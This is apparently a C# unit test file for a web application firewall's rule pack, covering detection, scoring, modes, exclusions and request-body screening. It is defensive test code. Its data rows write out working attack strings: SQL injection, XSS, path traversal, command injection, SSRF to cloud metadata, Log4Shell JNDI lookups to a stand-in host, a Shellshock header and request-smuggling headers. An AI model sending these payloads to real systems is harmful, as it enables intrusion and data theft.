using System.Diagnostics;
using System.Net;
using System.Text;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Titanium.Plus.Security;
using Titanium.Plus.Security.Waf;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.Abstractions;
using Titanium.Web.Proxy.Abstractions.Middleware;
using Titanium.Web.Proxy.Abstractions.Plugins;
using Titanium.Web.Proxy.Abstractions.Routing;
using Titanium.Web.Proxy.Extensions;
using Titanium.Web.Proxy.Http;
using Titanium.Web.Proxy.Models;
using Titanium.Web.Proxy.Routing;

namespace Titanium.Plus.Tests;

/// <summary>WAF v2: rule pack vectors, scoring, modes, exclusions, body handling, ReDoS guards, and wiring.</summary>
[TestClass]
public class WafV2Tests
{
    private static readonly string[] DisabledRulesSample = ["TW-XSS-001", "TW-SQLI-002"];

    private const string BrowserAgent =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36";

    private static WafOptions BlockOptions(int paranoia = 1) => new() { Mode = WafMode.Block, ParanoiaLevel = paranoia };

    private static WafVerdict Run(
        string target,
        WafOptions? options = null,
        IEnumerable<(string Name, string Value)>? headers = null,
        string? body = null,
        string? contentType = null,
        WafEngine? engine = null)
    {
        engine ??= new WafEngine(options ?? BlockOptions());
        HeaderCollection? collection = null;
        if (headers is not null)
        {
            collection = new HeaderCollection();
            foreach (var (name, value) in headers)
            {
                collection.AddHeader(name, value);
            }
        }

        return engine.Inspect(
            new WafRequest
            {
                Target = target,
                Headers = collection,
                Body = body is null ? ReadOnlyMemory<byte>.Empty : Encoding.UTF8.GetBytes(body),
                ContentType = contentType,
            },
            engine.DefaultProfile);
    }

    private static IEnumerable<(string, string)> Browser() =>
    [
        ("Host", "example.com"),
        ("User-Agent", BrowserAgent),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("Cookie", "session=abc123; theme=dark"),
        ("Referer", "https://example.com/products?id=3"),
    ];

    private static void AssertCategory(WafVerdict verdict, string category, string because)
    {
        Assert.IsTrue(
            verdict.Matches.Any(m => m.Category == category),
            $"{because}: expected category '{category}', got [{string.Join(", ", verdict.Matches.Select(m => m.RuleId))}]");
    }

    // ---------------------------------------------------------------- the pack

    [TestMethod]
    public void Pack_IsVersioned_HasUniqueIds_AndCoversEveryCategory()
    {
        StringAssert.StartsWith(WafRulePack.Version, "waf-pack-");
        var rules = WafRulePack.Rules;
        Assert.IsTrue(rules.Count >= 40, $"pack has {rules.Count} rules");
        Assert.AreEqual(rules.Count, rules.Select(r => r.Id).Distinct(StringComparer.OrdinalIgnoreCase).Count());

        var categories = rules.Select(r => r.Category).ToHashSet(StringComparer.Ordinal);
        foreach (var expected in new[]
                 {
                     "sqli", "xss", "path-traversal", "lfi", "command-injection", "ssrf", "scanner", "protocol", "log4j",
                 })
        {
            Assert.IsTrue(categories.Contains(expected), $"category {expected}");
        }

        foreach (var rule in rules)
        {
            Assert.IsFalse(string.IsNullOrWhiteSpace(rule.Id));
            Assert.IsFalse(string.IsNullOrWhiteSpace(rule.Category), rule.Id);
            Assert.AreNotEqual(WafTargets.None, rule.Targets, rule.Id);
            Assert.IsTrue(rule.Paranoia is >= 1 and <= 3, rule.Id);
            Assert.IsFalse(string.IsNullOrWhiteSpace(rule.Description), rule.Id);
        }
    }

    [TestMethod]
    public void Pack_PatternsLintClean_AndUseNonBacktrackingMatchers()
    {
        foreach (var rule in WafRulePack.Rules.Where(r => r.Pattern is not null))
        {
            Assert.AreEqual(0, WafPatternLinter.Lint(rule.Pattern!, ignoreCase: true).Count, rule.Id);
            Assert.IsNotNull(rule.CompiledRegex, rule.Id);
            Assert.IsTrue(WafPatternLinter.IsNonBacktracking(rule.CompiledRegex!), $"{rule.Id} should be NonBacktracking");
        }
    }

    [TestMethod]
    public void Pack_EveryRuleStaysUnderTimeBudget_OnMebibyteAdversarialInput()
    {
        const int size = 1024 * 1024;
        var inputs = new Dictionary<string, string>
        {
            ["a"] = new('a', size),
            ["spaces"] = new(' ', size),
            ["quotes"] = new('\'', size),
            ["angle"] = new('<', size),
            ["parens"] = new('(', size),
            ["semicolon-space"] = string.Concat(Enumerable.Repeat("; ", size / 2)),
            ["union"] = string.Concat(Enumerable.Repeat("union ", size / 6)),
            ["select"] = string.Concat(Enumerable.Repeat("select ", size / 7)),
            ["dots"] = string.Concat(Enumerable.Repeat("../", size / 3)),
            ["tag"] = "<a " + new string('x', size - 8) + "=",
            ["sql-quote-or"] = string.Concat(Enumerable.Repeat("' or ", size / 5)),
            ["slash-etc"] = string.Concat(Enumerable.Repeat("/etc/", size / 5)),
            ["http"] = string.Concat(Enumerable.Repeat("http://10.", size / 10)),
        };

        var total = Stopwatch.StartNew();
        foreach (var rule in WafRulePack.Rules.Where(r => r.IsPatternRule))
        {
            foreach (var (name, value) in inputs)
            {
                var timeouts = 0;
                var sw = Stopwatch.StartNew();
                _ = rule.Matches(value, ref timeouts);
                sw.Stop();
                Assert.IsTrue(
                    sw.ElapsedMilliseconds < 1500,
                    $"{rule.Id} took {sw.ElapsedMilliseconds} ms on '{name}' (timeouts={timeouts})");
            }
        }

        total.Stop();
        Assert.IsTrue(total.Elapsed < TimeSpan.FromSeconds(120), $"whole pack took {total.Elapsed}");
    }

    [TestMethod]
    public void Scanner_BoundedTime_OnMebibyteValuesInEveryTarget()
    {
        var engine = new WafEngine(BlockOptions(3));
        var big = new string('a', 1024 * 1024);
        var evil = string.Concat(Enumerable.Repeat("' or '", 1024 * 1024 / 6));

        foreach (var value in new[] { big, evil })
        {
            var sw = Stopwatch.StartNew();
            _ = Run("/p/" + value + "?q=" + value, engine: engine, headers: [("Cookie", "c=" + value), ("X-Big", value)]);
            sw.Stop();
            Assert.IsTrue(sw.ElapsedMilliseconds < 15_000, $"scan took {sw.ElapsedMilliseconds} ms");
        }
    }

    [TestMethod]
    public void Linter_RejectsRiskyAndBrokenPatterns()
    {
        Assert.IsTrue(WafPatternLinter.Lint("(a+)+$").Count > 0, "nested unbounded repeat");
        Assert.IsTrue(WafPatternLinter.Lint("(").Count > 0, "unbalanced");
        Assert.IsTrue(WafPatternLinter.Lint(new string('a', WafPatternLinter.MaxPatternLength + 1)).Count > 0, "too long");
        Assert.IsTrue(WafPatternLinter.Lint("").Count > 0, "empty");
        Assert.AreEqual(0, WafPatternLinter.Lint(@"\bunion\b\s+select").Count);
    }

    // ---------------------------------------------------------------- vectors per category

    [TestMethod]
    [DataRow("/s?id=1' OR '1'='1", "sqli")]
    [DataRow("/s?id=1 UNION SELECT user,pass FROM users", "sqli")]
    [DataRow("/s?id=1+union+all+select+null,null", "sqli")]
    [DataRow("/s?id=1;DROP TABLE users", "sqli")]
    [DataRow("/s?id=1+or+1=1", "sqli")]
    [DataRow("/s?q=<script>alert(1)</script>", "xss")]
    [DataRow("/s?q=<img src=x onerror=alert(1)>", "xss")]
    [DataRow("/s?u=<a href=\"javascript:alert(1)\">x</a>", "xss")]
    [DataRow("/files/../../secret", "path-traversal")]
    [DataRow("/files?name=..%2f..%2fsecret", "path-traversal")]
    [DataRow("/f?file=/etc/passwd", "lfi")]
    [DataRow("/f?file=C:\\windows\\win.ini", "lfi")]
    [DataRow("/p?host=1.1.1.1;whoami", "command-injection")]
    [DataRow("/p?x=$(id)", "command-injection")]
    [DataRow("/p?x=a|/bin/sh+-c+ls", "command-injection")]
    [DataRow("/p?u=http://169.254.169.254/latest/meta-data/", "ssrf")]
    [DataRow("/p?u=http://metadata.google.internal/computeMetadata/v1/", "ssrf")]
    [DataRow("/p?x=${jndi:ldap://evil.example/a}", "log4j")]
    [DataRow("/p?x=%24%7Bjndi%3Armi%3A%2F%2Fevil%2Fa%7D", "log4j")]
    [DataRow("/s?q=sel%00ect", "protocol")]
    public void Vectors_Positive_ReachBlockThreshold(string target, string category)
    {
        var verdict = Run(target, BlockOptions(2));
        AssertCategory(verdict, category, target);
        Assert.IsTrue(verdict.WouldBlock, $"{target} score={verdict.Score}");
        Assert.IsTrue(verdict.Blocked, target);
    }

    [TestMethod]
    [DataRow("/s?id=1+AND+SLEEP(5)", "sqli")]
    [DataRow("/s?q=<iframe src=//evil.example>", "xss")]
    [DataRow("/s?q=document.cookie", "xss")]
    [DataRow("/a/..;/admin", "path-traversal")]
    [DataRow("/site/.git/config", "lfi")]
    [DataRow("/f?p=php://filter/convert.base64-encode/resource=index", "lfi")]
    [DataRow("/p?u=gopher://127.0.0.1:6379/_PING", "ssrf")]
    public void Vectors_ErrorSeverity_IsDetected_ButAloneStaysBelowTheDefaultThreshold(string target, string category)
    {
        var verdict = Run(target, BlockOptions());
        AssertCategory(verdict, category, target);
        Assert.AreEqual((int)WafSeverity.Error, verdict.Score, target);
        Assert.IsFalse(verdict.WouldBlock, target);
    }

    [TestMethod]
    public void Vectors_HeaderAndCookieTargets()
    {
        var shellshock = Run("/", BlockOptions(), [("Host", "x"), ("User-Agent", "() { :; }; /bin/ping -c1 evil")]);
        AssertCategory(shellshock, "command-injection", "shellshock");
        Assert.IsTrue(shellshock.Blocked);

        var scanner = Run("/", BlockOptions(), [("Host", "x"), ("User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")]);
        AssertCategory(scanner, "scanner", "scanner UA");
        Assert.IsTrue(scanner.Blocked);
        Assert.AreEqual(WafTargets.Header, scanner.Matches[0].Target);

        var referer = Run("/", BlockOptions(), [("Host", "x"), ("Referer", "http://169.254.169.254/latest/meta-data/")]);
        AssertCategory(referer, "ssrf", "metadata in referer");
        Assert.IsTrue(referer.Blocked);

        var jndiHeader = Run("/", BlockOptions(), [("Host", "x"), ("X-Api-Version", "${jndi:ldap://x.example/a}")]);
        AssertCategory(jndiHeader, "log4j", "jndi header");
        Assert.IsTrue(jndiHeader.Blocked);

        var cookie = Run("/", BlockOptions(), [("Host", "x"), ("Cookie", "a=1; b=<script>alert(1)</script>")]);
        AssertCategory(cookie, "xss", "cookie");
        var match = cookie.Matches.First(m => m.Category == "xss");
        Assert.AreEqual(WafTargets.Cookie, match.Target);
        Assert.AreEqual("b", match.Name);
    }

    [TestMethod]
    public void Vectors_Protocol_Anomalies()
    {
        var badLength = Run("/", BlockOptions(), [("Host", "x"), ("Content-Length", "12abc")]);
        Assert.IsTrue(badLength.Matches.Any(m => m.RuleId == "TW-PROTO-001"), "invalid content-length");

        var negative = Run("/", BlockOptions(), [("Host", "x"), ("Content-Length", "-5")]);
        Assert.IsTrue(negative.Matches.Any(m => m.RuleId == "TW-PROTO-001"), "negative content-length");

        var dupHost = Run("/", BlockOptions(), [("Host", "a.example"), ("Host", "b.example")]);
        Assert.IsTrue(dupHost.Matches.Any(m => m.RuleId == "TW-PROTO-002"), "duplicate host");

        var smuggle = Run("/", BlockOptions(), [("Host", "x"), ("Content-Length", "5"), ("Transfer-Encoding", "chunked")]);
        Assert.IsTrue(smuggle.Matches.Any(m => m.RuleId == "TW-PROTO-006"), "CL + TE");
        Assert.IsTrue(smuggle.Blocked);

        var nul = Run("/a%00.png", BlockOptions());
        Assert.IsTrue(nul.Matches.Any(m => m.RuleId == "TW-PROTO-003"), "null byte");

        var clean = Run("/", BlockOptions(), [("Host", "x"), ("Content-Length", "5")]);
        Assert.AreEqual(0, clean.Matches.Count);
    }

    [TestMethod]
    public void Vectors_OversizedArg_RespectsMaxArgLength()
    {
        var options = new WafOptions { Mode = WafMode.Block, MaxArgLength = 64 };
        var small = Run("/s?q=" + new string('a', 64), options);
        Assert.IsFalse(small.Matches.Any(m => m.RuleId == "TW-PROTO-004"), "at the limit");
        var large = Run("/s?q=" + new string('a', 65), options);
        Assert.IsTrue(large.Matches.Any(m => m.RuleId == "TW-PROTO-004"), "over the limit");
    }

    // ---------------------------------------------------------------- negatives and benign traffic

    [TestMethod]
    [DataRow("/")]
    [DataRow("/search?q=hello+world&page=2")]
    [DataRow("/search?q=select+a+shirt+from+the+store")]
    [DataRow("/users?name=O%27Brien")]
    [DataRow("/blog/how-to-union-your-team-and-select-leaders")]
    [DataRow("/q?title=Tom+%26+Jerry")]
    [DataRow("/q?msg=cats+and+dogs")]
    [DataRow("/img/logo-v2.png?width=200&height=100")]
    [DataRow("/api/v1/items/42")]
    [DataRow("/q?redirect=https%3A%2F%2Fexample.com%2Fhome")]
    [DataRow("/q?email=user%40example.com")]
    [DataRow("/q?code=A1B2-C3D4")]
    [DataRow("/q?text=I+love+%3C3")]
    [DataRow("/q?path=a%2Fb%2Fc.txt")]
    [DataRow("/q?sort=price&order=desc&filter=in-stock")]
    [DataRow("/assets/app.min.js?v=1.2.3")]
    [DataRow("/q?note=drop+me+a+line")]
    [DataRow("/q?name=Anna-Marie+Müller")]
    public void Benign_Requests_AreClean_AtParanoiaOne(string target)
    {
        var verdict = Run(target, BlockOptions(), Browser());
        Assert.AreEqual(0, verdict.Matches.Count, $"{target}: [{string.Join(", ", verdict.Matches.Select(m => m.RuleId))}]");
        Assert.AreEqual(0, verdict.Score);
        Assert.IsFalse(verdict.WouldBlock);
    }

    [TestMethod]
    public void Benign_Bodies_AreClean()
    {
        var json = Run(
            "/api/comments", BlockOptions(), Browser(),
            """{"name":"Alice","comment":"Select your plan from the list, then drop by!","age":30,"tags":["a","b"]}""",
            "application/json");
        Assert.AreEqual(0, json.Matches.Count, string.Join(", ", json.Matches.Select(m => m.RuleId)));

        var form = Run(
            "/login", BlockOptions(), Browser(), "user=alice&password=correct+horse+battery+staple&remember=1",
            "application/x-www-form-urlencoded");
        Assert.AreEqual(0, form.Matches.Count, string.Join(", ", form.Matches.Select(m => m.RuleId)));
    }

    [TestMethod]
    public void Paranoia_SelectsRuleSubsets()
    {
        // Reuse one engine so pack compile/warmup is paid once; empty matches with RuleTimeouts>0 used to flake
        // when NonBacktracking rules shared the 5 ms backtracking budget under CI load.
        var p1Engine = new WafEngine(BlockOptions(1));
        var p2Engine = new WafEngine(BlockOptions(2));
        var p3Engine = new WafEngine(BlockOptions(3));

        const string target = "/s?q=select+a+shirt+from+the+store";
        var p1 = Run(target, engine: p1Engine);
        Assert.AreEqual(0, p1.Matches.Count, "p1");
        Assert.AreEqual(0, p1.RuleTimeouts, "p1 timeouts");
        var p2 = Run(target, engine: p2Engine);
        Assert.AreEqual(0, p2.RuleTimeouts, "p2 timeouts");
        Assert.IsTrue(p2.Matches.Any(m => m.RuleId == "TW-SQLI-008"), "p2");

        const string drop = "/s?q=please+drop+me+a+line";
        var p2Drop = Run(drop, engine: p2Engine);
        Assert.AreEqual(0, p2Drop.Matches.Count, "p2 drop");
        Assert.AreEqual(0, p2Drop.RuleTimeouts, "p2 drop timeouts");
        var p3 = Run(drop, engine: p3Engine);
        Assert.AreEqual(0, p3.RuleTimeouts, "p3 timeouts");
        Assert.IsTrue(p3.Matches.Any(m => m.RuleId == "TW-SQLI-010"), "p3");

        Assert.IsTrue(p2Engine.DefaultProfile.RuleSet.All.All(r => r.Paranoia <= 2));
    }

    [TestMethod]
    public void Benign_LowParanoiaSignals_StayBelowThreshold()
    {
        // A lone notice (weight 2) is noted, not blocked.
        var verdict = Run("/s?q=<b>hi", BlockOptions(3));
        Assert.IsTrue(verdict.Matches.Count > 0, "paranoia 3 sees the tag");
        Assert.IsTrue(verdict.Score > 0);
        Assert.IsFalse(verdict.WouldBlock, $"score={verdict.Score}");
    }

    // ---------------------------------------------------------------- encoding evasion

    [TestMethod]
    [DataRow("/s?q=%2527%2520OR%2520%25271%2527%253D%25271", "sqli", "double URL encoding")]
    [DataRow("/s?q=%253Cscript%253Ealert(1)%253C/script%253E", "xss", "double encoded tags")]
    [DataRow("/s?q=1+UnIoN+SeLeCt+1,2", "sqli", "mixed case")]
    [DataRow("/s?q=%3CSCRIPT%3Ealert(1)", "xss", "uppercase")]
    [DataRow("/s?q=%u003cscript%u003ealert(1)", "xss", "%u encoding")]
    [DataRow("/s?q=%26lt%3Bscript%26gt%3Balert(1)", "xss", "html entities")]
    [DataRow("/s?q=%26%23x3c%3Bscript%26%23x3e%3B", "xss", "numeric entities")]
    [DataRow("/s?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "lfi", "encoded dots")]
    [DataRow("/s?q=%c0%ae%c0%ae/%c0%ae%c0%ae/x", "path-traversal", "overlong utf-8")]
    [DataRow("/s?q=<scr%00ipt>alert(1)", "xss", "NUL inside a tag")]
    [DataRow("/s?q=%25252e%25252e%25252fx", "path-traversal", "triple encoding")]
    [DataRow("/%2e%2e/%2e%2e/admin", "path-traversal", "encoded path")]
    public void Evasion_IsNormalizedBeforeMatching(string target, string category, string because)
    {
        AssertCategory(Run(target, BlockOptions(2)), category, because);
    }

    [TestMethod]
    public void Evasion_NulByteIsFlagged_AndTripleEncodingIsScoredAtParanoiaTwo()
    {
        var nul = Run("/s?q=sel%00ect", BlockOptions());
        Assert.IsTrue(nul.Matches.Any(m => m.RuleId == "TW-PROTO-003"));
        Assert.IsTrue(nul.Blocked);

        var deep = Run("/s?q=%25252e%25252e%25252fx", BlockOptions(2));
        Assert.IsTrue(deep.Matches.Any(m => m.RuleId == "TW-PROTO-005"), "encoding depth");
        Assert.IsFalse(
            Run("/s?q=%25252e%25252e%25252fx", BlockOptions(1)).Matches.Any(m => m.RuleId == "TW-PROTO-005"),
            "depth rule is paranoia 2");
    }

    [TestMethod]
    public void Evasion_PlusIsSpaceInQueryOnly()
    {
        Assert.IsTrue(Run("/s?q=1+or+1=1", BlockOptions()).Matches.Any(m => m.Category == "sqli"));
        // In the path a plus is a plus.
        Assert.AreEqual(0, Run("/s/1+or+1=1", BlockOptions()).Matches.Count(m => m.Category == "sqli"));
    }

    // ---------------------------------------------------------------- scoring

    [TestMethod]
    public void Score_UsesSeverityWeights_AndEachRuleCountsOncePerRequest()
    {
        var verdict = Run("/s?a=<script>&b=<script>&c=<script>", BlockOptions());
        Assert.AreEqual(1, verdict.Matches.Count(m => m.RuleId == "TW-XSS-001"));
        Assert.AreEqual(verdict.Matches.Sum(m => m.Score), verdict.Score);
        Assert.AreEqual((int)WafSeverity.Critical, verdict.Matches.First(m => m.RuleId == "TW-XSS-001").Score);
    }

    [TestMethod]
    public void Score_Threshold_DecidesWouldBlock()
    {
        const string attack = "/s?q=<script>alert(1)</script>";
        var weights = new WafOptions { Mode = WafMode.Block, BlockThreshold = 1000 };
        var lenient = Run(attack, weights);
        Assert.IsTrue(lenient.Score > 0);
        Assert.IsFalse(lenient.WouldBlock);
        Assert.IsFalse(lenient.Blocked);

        var exact = Run(attack, new WafOptions { Mode = WafMode.Block, BlockThreshold = 1 });
        Assert.IsTrue(exact.Blocked);

        var heavier = Run(attack, new WafOptions { Mode = WafMode.Block, CriticalWeight = 50, ErrorWeight = 50, BlockThreshold = 40 });
        Assert.IsTrue(heavier.Score >= 50);
        Assert.IsTrue(heavier.Blocked);
    }

    [TestMethod]
    public void Score_TwoWarnings_ReachTheDefaultThreshold_ButOneDoesNot()
    {
        var two = Run("/s?a=x'--&b=<svg>", BlockOptions(2));
        Assert.IsTrue(two.Matches.Count(m => m.Severity == WafSeverity.Warning) >= 2, string.Join(", ", two.Matches.Select(m => m.RuleId)));
        Assert.IsTrue(two.WouldBlock, $"score={two.Score}");

        var one = Run("/s?b=<svg>", BlockOptions(2));
        Assert.IsTrue(one.Score > 0);
        Assert.IsFalse(one.WouldBlock, $"score={one.Score}");
    }

    // ---------------------------------------------------------------- modes

    [TestMethod]
    public void Mode_Detect_ReportsWouldBlock_ButNeverBlocks()
    {
        var verdict = Run("/s?q=<script>alert(1)</script>", new WafOptions { Mode = WafMode.Detect });
        Assert.AreEqual(WafMode.Detect, verdict.Mode);
        Assert.IsTrue(verdict.WouldBlock);
        Assert.IsFalse(verdict.Blocked);
    }

    [TestMethod]
    public void Mode_Block_Blocks_AndOffSkipsScanning()
    {
        var blocked = Run("/s?q=<script>alert(1)</script>", new WafOptions { Mode = WafMode.Block });
        Assert.IsTrue(blocked.Blocked);

        var off = Run("/s?q=<script>alert(1)</script>", new WafOptions { Mode = WafMode.Off });
        Assert.AreEqual(0, off.Matches.Count);
        Assert.IsFalse(off.WouldBlock);
        Assert.IsFalse(off.Blocked);
    }

    [TestMethod]
    public void Mode_DefaultsToDetect_WhenEnabledWithoutAMode()
    {
        Assert.AreEqual(WafMode.Detect, new WafOptions().Mode);
        Assert.AreEqual(WafMode.Detect, WafOptions.FromOptions(new Dictionary<string, string> { ["waf.enabled"] = "true" }).Mode);
        Assert.AreEqual(WafMode.Block, WafOptions.FromOptions(new Dictionary<string, string> { ["waf.mode"] = "BLOCK" }).Mode);
        Assert.AreEqual(WafMode.Off, WafOptions.FromOptions(new Dictionary<string, string> { ["waf.mode"] = "off" }).Mode);
        Assert.ThrowsExactly<InvalidOperationException>(
            () => WafOptions.FromOptions(new Dictionary<string, string> { ["waf.mode"] = "audit" }));
    }

    [TestMethod]
    public void Options_ParseAndRejectOutOfRangeValues()
    {
        var o = WafOptions.FromOptions(new Dictionary<string, string>
        {
            ["waf.paranoia"] = "3",
            ["waf.blockThreshold"] = "9",
            ["waf.inspectBodyBytes"] = "2048",
            ["waf.disableRules"] = "TW-XSS-001, TW-SQLI-002",
            ["waf.exclusions"] = "sqli@query:q",
            ["waf.score.critical"] = "8",
        });
        Assert.AreEqual(3, o.ParanoiaLevel);
        Assert.AreEqual(9, o.BlockThreshold);
        Assert.AreEqual(2048, o.InspectBodyBytes);
        CollectionAssert.AreEqual(DisabledRulesSample, o.DisabledRules.ToArray());
        Assert.AreEqual(8, o.CriticalWeight);
        Assert.AreEqual(8 * 1024, new WafOptions().InspectBodyBytes);

        foreach (var (key, value) in new[] { ("waf.paranoia", "4"), ("waf.paranoia", "0"), ("waf.blockThreshold", "0"), ("waf.inspectBodyBytes", "-1"), ("waf.inspectBodyBytes", "abc") })
        {
            var message = $"{key}={value}";
            Assert.ThrowsExactly<InvalidOperationException>(
                () => WafOptions.FromOptions(new Dictionary<string, string> { [key] = value }), message);
        }
    }

    // ---------------------------------------------------------------- disable list and exclusions

    [TestMethod]
    public void DisabledRules_AreNotEvaluated()
    {
        const string target = "/s?q=<script>alert(1)</script>";
        var baseline = Run(target, BlockOptions());
        Assert.IsTrue(baseline.Matches.Any(m => m.RuleId == "TW-XSS-001"));

        var disabled = Run(target, new WafOptions { Mode = WafMode.Block, DisabledRules = ["tw-xss-001", "TW-XSS-005"] });
        Assert.IsFalse(disabled.Matches.Any(m => m.RuleId is "TW-XSS-001" or "TW-XSS-005"));
    }

    [TestMethod]
    public void Exclusions_SkipOnlyTheNamedPart()
    {
        var options = new WafOptions { Mode = WafMode.Block, Exclusions = ["sqli@query:q"] };
        const string attack = "1' OR '1'='1";
        Assert.AreEqual(0, Run("/s?q=" + attack, options).Matches.Count(m => m.Category == "sqli"), "excluded parameter");
        Assert.IsTrue(Run("/s?other=" + attack, options).Matches.Any(m => m.Category == "sqli"), "another parameter still fires");
        Assert.IsTrue(Run("/s?q=<script>", options).Matches.Any(m => m.Category == "xss"), "other categories still fire for q");
    }

    [TestMethod]
    public void Exclusions_ByRuleIdCategoryAndHeader()
    {
        var byId = new WafOptions { Mode = WafMode.Block, Exclusions = ["TW-XSS-001"] };
        Assert.IsFalse(Run("/s?q=<script>", byId).Matches.Any(m => m.RuleId == "TW-XSS-001"));

        var byCategoryCookie = new WafOptions { Mode = WafMode.Block, Exclusions = ["xss@cookie"] };
        var headers = new[] { ("Host", "x"), ("Cookie", "b=<script>alert(1)</script>") };
        Assert.AreEqual(0, Run("/", byCategoryCookie, headers).Matches.Count(m => m.Category == "xss"));
        Assert.IsTrue(Run("/s?q=<script>", byCategoryCookie).Matches.Any(m => m.Category == "xss"), "query not excluded");

        var refererOnly = new WafOptions { Mode = WafMode.Block, Exclusions = ["*@header:Referer"] };
        var referer = new[] { ("Host", "x"), ("Referer", "http://a.example/?q=<script>alert(1)</script>") };
        Assert.AreEqual(0, Run("/", refererOnly, referer).Matches.Count);
        var agent = new[] { ("Host", "x"), ("X-Other", "<script>alert(1)</script>") };
        Assert.IsTrue(Run("/", refererOnly, agent).Matches.Count > 0, "other headers still scanned");
    }

    [TestMethod]
    public void RoutePolicy_OverridesModeParanoiaThresholdAndExclusions()
    {
        var engine = new WafEngine(new WafOptions { Mode = WafMode.Detect });
        var strict = engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "strict", Kind = "waf", Mode = "block" });
        var off = engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "off", Kind = "waf", Mode = "off" });
        var paranoid = engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "p", Kind = "waf", ParanoiaLevel = 3, BlockThreshold = 3 });
        var excluded = engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "x", Kind = "waf", Mode = "block", Exclusions = ["sqli@query:q"] });
        var noXss = engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "nx", Kind = "waf", Mode = "block", DisabledRules = ["TW-XSS-001"] });

        var request = new WafRequest { Target = "/s?q=<script>alert(1)</script>" };
        Assert.IsTrue(engine.Inspect(request, engine.DefaultProfile).WouldBlock);
        Assert.IsFalse(engine.Inspect(request, engine.DefaultProfile).Blocked, "default is detect");
        Assert.IsTrue(engine.Inspect(request, strict).Blocked, "route policy blocks");
        Assert.AreEqual(0, engine.Inspect(request, off).Matches.Count, "route policy turns the WAF off");
        Assert.AreEqual(WafMode.Detect, paranoid.Mode, "mode is inherited");
        Assert.AreEqual(3, paranoid.ParanoiaLevel);
        Assert.AreEqual(3, paranoid.BlockThreshold);
        Assert.IsFalse(engine.Inspect(request, noXss).Matches.Any(m => m.RuleId == "TW-XSS-001"));

        var sqli = new WafRequest { Target = "/s?q=1' OR '1'='1" };
        Assert.AreEqual(0, engine.Inspect(sqli, excluded).Matches.Count(m => m.Category == "sqli"), "per-route exclusion");
        Assert.IsTrue(engine.Inspect(sqli, strict).Matches.Any(m => m.Category == "sqli"));
    }

    [TestMethod]
    public void Profiles_AreCached_AndRuleSetsAreSharedByEqualSettings()
    {
        var engine = new WafEngine(new WafOptions { Mode = WafMode.Detect });
        var built = engine.Profiles.RuleSetsBuilt;
        var a = new RoutePolicyConfig { Name = "a", Kind = "waf", Mode = "block" };
        var b = new RoutePolicyConfig { Name = "b", Kind = "waf", Mode = "detect", BlockThreshold = 9 };
        var first = engine.Profiles.ForPolicy(a);
        Assert.AreSame(first, engine.Profiles.ForPolicy(a), "policy profile is cached");
        var second = engine.Profiles.ForPolicy(b);
        Assert.AreSame(first.RuleSet, second.RuleSet, "same paranoia and disable list share one rule set");
        Assert.AreSame(engine.DefaultProfile.RuleSet, first.RuleSet);
        Assert.AreEqual(built, engine.Profiles.RuleSetsBuilt);

        engine.Profiles.ForPolicy(new RoutePolicyConfig { Name = "c", Kind = "waf", ParanoiaLevel = 2 });
        Assert.AreEqual(built + 1, engine.Profiles.RuleSetsBuilt);
    }

    [TestMethod]
    public void Middleware_RegistersWafPolicies_AndIgnoresOtherKinds()
    {
        var none = new WafScreeningMiddleware(new WafOptions(), policies: [new RoutePolicyConfig { Name = "t", Kind = "timeout", TimeoutSeconds = 5 }]);
        Assert.IsFalse(none.HasRoutePolicies);
        var some = new WafScreeningMiddleware(new WafOptions(), policies: [new RoutePolicyConfig { Name = "w", Kind = "waf", Mode = "block" }]);
        Assert.IsTrue(some.HasRoutePolicies);
        Assert.ThrowsExactly<InvalidOperationException>(() =>
            new WafScreeningMiddleware(new WafOptions(), policies: [new RoutePolicyConfig { Name = "w", Kind = "waf", Mode = "audit" }]));
        Assert.ThrowsExactly<InvalidOperationException>(() =>
            new WafScreeningMiddleware(new WafOptions(), policies: [new RoutePolicyConfig { Name = "w", Kind = "waf", Exclusions = ["sqli@nowhere"] }]));
    }

    [TestMethod]
    public void PeekRoute_MatchesTheRouteBeforeDispatch()
    {
        var route = new RouteConfig
        {
            Id = "api",
            ClusterId = "c",
            Policies = ["waf-strict"],
            Match = new RouteMatch { Path = "/api", PathKind = PathMatchKind.Prefix },
        };
        var other = new RouteConfig
        {
            Id = "web",
            ClusterId = "c",
            Match = new RouteMatch { Path = "/", PathKind = PathMatchKind.Prefix },
        };
        var options = new ReverseProxyOptions { Routes = [route, other] };
        var request = new Request { Method = "GET", HttpVersion = HttpHeader.Version11 };
        request.RequestUriString8 = "/api/items?id=1".GetByteString();
        Assert.AreEqual("api", DestinationResolver.MatchRoute(options, request, null)?.Id);
        request.RequestUriString8 = "/index.html".GetByteString();
        Assert.AreEqual("web", DestinationResolver.MatchRoute(options, request, null)?.Id);
        Assert.IsNull(DestinationResolver.MatchRoute(null, request, null));
    }

    // ---------------------------------------------------------------- bodies

    [TestMethod]
    public void Body_UrlEncodedJsonAndMultipart_AreScreened()
    {
        var form = Run("/login", BlockOptions(), Browser(), "user=admin&pw=' OR '1'='1", "application/x-www-form-urlencoded; charset=utf-8");
        AssertCategory(form, "sqli", "form body");
        Assert.AreEqual(WafTargets.Body, form.Matches.First(m => m.Category == "sqli").Target);

        var json = Run(
            "/api", BlockOptions(), Browser(),
            """{"q":"<script>alert(1)</script>","n":{"k":["ok","1 UNION SELECT 1,2"]}}""",
            "application/json");
        AssertCategory(json, "xss", "json value");
        AssertCategory(json, "sqli", "nested json value");

        var vendor = Run("/api", BlockOptions(), Browser(), """{"q":"<script>alert(1)</script>"}""", "application/vnd.api+json");
        AssertCategory(vendor, "xss", "+json media type");

        const string boundary = "XyZ";
        var multipart = string.Join(
            "\r\n",
            "--" + boundary,
            "Content-Disposition: form-data; name=\"comment\"",
            "",
            "hello <script>alert(1)</script>",
            "--" + boundary + "--",
            "");
        var part = Run("/up", BlockOptions(), Browser(), multipart, $"multipart/form-data; boundary={boundary}");
        AssertCategory(part, "xss", "multipart text field");
    }

